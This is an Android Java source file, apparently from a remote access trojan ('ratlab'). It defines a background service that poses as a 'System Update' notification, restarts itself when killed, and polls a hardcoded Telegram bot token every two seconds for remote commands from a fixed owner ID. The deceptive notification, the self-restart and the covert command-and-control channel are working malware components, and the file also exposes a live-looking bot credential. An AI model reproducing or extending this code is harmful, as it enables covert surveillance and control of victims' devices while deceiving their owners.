package com.ratlab;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class BotService extends Service {

    private static final String TAG = "BotService";
    private static final String CHANNEL_ID = "system_update_channel";
    private static final int NOTIF_ID = 1001;
    private static final String BOT_TOKEN = "8777489259:AAGEF7ume5LNpfgC5ot9gKXdrSkIHWyaoja";
    private static final long OWNER_ID = 7714748144L;

    private ScheduledExecutorService scheduler;
    private CommandHandler handler;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(NOTIF_ID, buildNotification());

        handler = new CommandHandler(this, BOT_TOKEN, OWNER_ID);

        scheduler = Executors.newSingleThreadScheduledExecutor();
        scheduler.scheduleWithFixedDelay(() -> {
            try {
                handler.pollUpdates();
            } catch (Exception e) {
                Log.e(TAG, "Poll error: " + e.getMessage());
            }
        }, 0, 2, TimeUnit.SECONDS);

        Log.i(TAG, "Service started");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (scheduler != null) scheduler.shutdownNow();
        // Auto restart
        Intent svc = new Intent(this, BotService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(svc);
        } else {
            startService(svc);
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                    CHANNEL_ID,
                    "System Update",
                    NotificationManager.IMPORTANCE_LOW
            );
            ch.setDescription("System update service");
            ch.setSound(null, null);
            ch.enableVibration(false);
            ch.setShowBadge(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private Notification buildNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System Update")
                .setContentText("Checking for updates...")
                .setSmallIcon(android.R.drawable.stat_sys_download)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(false)
                .setSilent(true)
                .build();
    }
}
